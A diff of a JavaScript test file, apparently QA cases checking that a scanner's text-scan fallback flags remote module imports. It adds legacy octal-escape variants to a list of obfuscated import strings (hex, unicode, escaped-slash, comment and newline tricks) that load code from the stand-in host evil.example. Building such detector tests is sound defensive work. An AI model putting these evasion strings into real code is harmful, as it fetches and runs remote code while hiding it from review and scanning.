@@ -282,6 +282,8 @@ describe('SP-4 QA: budget-skipped files cannot slip past the text-scan fallback'
     ['export*from/*c*/url', `export*from/*c*/'${EVIL}'`],
     ['escaped slashes \\/', `import('https:\\/\\/evil.example\\/x.js')`],
     ['\\xNN escapes', `import('\\x68ttps://evil\\x2eexample/x.js')`],
+    ['legacy octal escapes', `import('\\150ttps://evil.example/x.js')`],
+    ['legacy octal 2-digit + \\0', `import('h\\164tps:\\57/evil\\56example/x.js\\0')`],
     ['\\uNNNN escapes', `import('\\u0068ttps://evil.example/x.js')`],
     ['newline padding', `import\n\n(\n'${EVIL}'\n)`],
   ];
